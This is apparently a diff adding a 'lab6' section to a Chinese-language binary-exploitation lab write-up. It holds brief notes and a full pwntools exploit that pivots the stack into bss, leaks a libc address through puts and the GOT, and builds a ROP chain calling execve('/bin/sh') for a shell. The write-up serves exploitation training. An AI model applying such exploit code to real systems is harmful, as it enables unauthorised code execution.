@@ -326,3 +326,39 @@ leave = mov sb,bp;pop bp
     r.interactive()
 ```
 
+# lab6
+
+同上栈迁移
+
+ropper生成的ropchain执行失败，还是使用pwntools辅助生成好些，注意设置libc.address
+
+直接写在elf.bss()会出错，应该偏移一段距离，别太懒了。
+
+```
+    leave_ret=0x8048504
+    ru(':\n')
+    buf1=elf.bss()+0x600
+    p1='a'*0x28+p32(buf1)+\
+       p32(elf.symbols['read'])+p32(leave_ret)+p32(0)+p32(buf1)+p32(0x100)
+    sn(p1)
+
+    buf2=elf.bss()+0x800
+    pop_ret=0x8048586
+    p2=p32(buf2)+p32(elf.symbols['puts'])+p32(pop_ret)+p32(elf.got['read'])+\
+       p32(elf.symbols['read'])+p32(leave_ret)+p32(0)+p32(buf2)+p32(0x100)
+
+    sl(p2)
+    read_real=u32(rn(4))
+    info(hex(read_real))
+    libc_base=read_real-libc.symbols['read']
+    info(hex(libc_base))
+
+    libc.address=libc_base
+    rop=ROP(libc)
+    binsh=libc.search('/bin/sh').next()
+    info(hex(binsh))
+    rop.execve(binsh, 0, 0)
+    print rop.dump()
+    sl('a'*4+str(rop))
+    r.interactive()
+```
